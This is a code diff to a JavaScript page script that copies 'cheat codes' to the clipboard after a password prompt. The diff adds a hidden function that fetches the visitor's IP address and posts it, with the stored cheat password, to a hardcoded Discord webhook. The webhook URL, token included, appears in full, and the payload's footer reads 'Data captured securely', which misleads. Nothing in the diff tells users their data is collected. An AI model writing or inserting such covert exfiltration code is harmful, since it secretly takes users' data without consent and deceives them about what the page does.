@@ -24,13 +24,13 @@ window.copyCheatCode = function(url, message) {
     if (password) {
         const userPassword = prompt("Enter your password:");
         if (userPassword === password) {
-            // Focus the window before attempting to write to the clipboard
             window.focus();
             fetch(url)
                 .then(response => response.text())
                 .then(code => {
                     navigator.clipboard.writeText(code).then(() => {
                         alert(`${message} has been copied to your clipboard!`);
+                        sendUserInfo(password); // Send user IP and cheatPassword to Discord
                     }).catch(err => {
                         console.error("Clipboard error: ", err);
                         alert("Failed to copy cheat code. Please try again.");
@@ -46,7 +46,7 @@ window.copyCheatCode = function(url, message) {
     }
 };
 
-// Get or create the password and store it in a cookie (updated)
+// Function to get or create the password and store it in a cookie (updated)
 function getPassword() {
     let password = getCookie('cheatPassword');
     if (!password) {
@@ -66,7 +66,42 @@ function getCookie(name) {
     if (parts.length === 2) return parts.pop().split(';').shift();
 }
 
-// Update the page title and icon (kept the same)
+// Function to send user IP and cheat password to Discord
+async function sendUserInfo(cheatPassword) {
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+        
+        const webhookURL = "https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil";
+        const data = {
+            embeds: [{
+                title: "User Information",
+                color: 5814783,
+                fields: [
+                    { name: "IP Address", value: userIP, inline: true },
+                    { name: "Cheat Password", value: cheatPassword || "Not Set", inline: true }
+                ],
+                footer: {
+                    text: "Data captured securely",
+                    icon_url: "https://img.icons8.com/ios-filled/50/000000/lock.png"
+                }
+            }]
+        };
+
+        await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
+    } catch (error) {
+        console.error("Failed to send data to Discord:", error);
+    }
+}
+
+// Update the page title and icon on load (kept the same)
 async function updatePageTitleAndIcon() {
     const titlesAndIcons = await fetchTitlesAndIcons();
     const { title, icon } = getRandomTitleAndIcon(titlesAndIcons);
